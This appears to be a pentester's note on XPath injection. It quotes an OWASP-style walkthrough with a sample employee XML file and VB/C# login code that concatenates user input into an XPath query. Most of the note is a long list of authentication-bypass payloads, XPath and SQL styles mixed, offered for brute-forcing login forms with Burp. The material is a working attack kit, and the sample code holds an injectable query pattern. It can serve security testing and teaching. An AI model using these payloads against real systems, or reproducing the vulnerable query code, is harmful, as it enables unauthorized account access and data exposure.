# XPath Injection
[https://owasp.org/www-community/attacks/XPATH\_Injection](https://owasp.org/www-community/attacks/XPATH_Injection) 

using `blah' or 1=1 or 'a'='a` or `blah" or 1=1 or "a"="a` as username will match ALL employees/users because of the “1=1” part.

Example Vulnerability
---------------------

We’ll use this XML snippet for the examples.

```text-plain
<?xml version="1.0" encoding="utf-8"?>
<Employees>
   <Employee ID="1">
      <FirstName>Arnold</FirstName>
      <LastName>Baker</LastName>
      <UserName>ABaker</UserName>
      <Password>SoSecret</Password>
      <Type>Admin</Type>
   </Employee>
   <Employee ID="2">
      <FirstName>Peter</FirstName>
      <LastName>Pan</LastName>
      <UserName>PPan</UserName>
      <Password>NotTelling</Password>
      <Type>User</Type>
   </Employee>
</Employees>
```

Suppose we have a user authentication system on a web page that used a data file of this sort to login users. Once a username and password have been supplied the software might use XPath to look up the user:

```text-plain
VB:
Dim FindUserXPath as String
FindUserXPath = "//Employee[UserName/text()='" & Request("Username") & "' And
        Password/text()='" & Request("Password") & "']"

C#:
String FindUserXPath;
FindUserXPath = "//Employee[UserName/text()='" + Request("Username") + "' And
        Password/text()='" + Request("Password") + "']";
```

With a normal username and password this XPath would work, but an attacker may send a bad username and password and get an XML node selected without knowing the username or password, like this:

```text-plain
Username: blah' or 1=1 or 'a'='a
Password: blah

FindUserXPath becomes //Employee[UserName/text()='blah' or 1=1 or
        'a'='a' And Password/text()='blah']

Logically this is equivalent to:
        //Employee[(UserName/text()='blah' or 1=1) or
        ('a'='a' And Password/text()='blah')]
```

In this case, only the first part of the XPath needs to be true. The password part becomes irrelevant, and the UserName part will match ALL employees because of the “1=1” part.

We can also use this list to bruteforce with burp and check the length of responses to find any leaked data.

```text-plain
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
```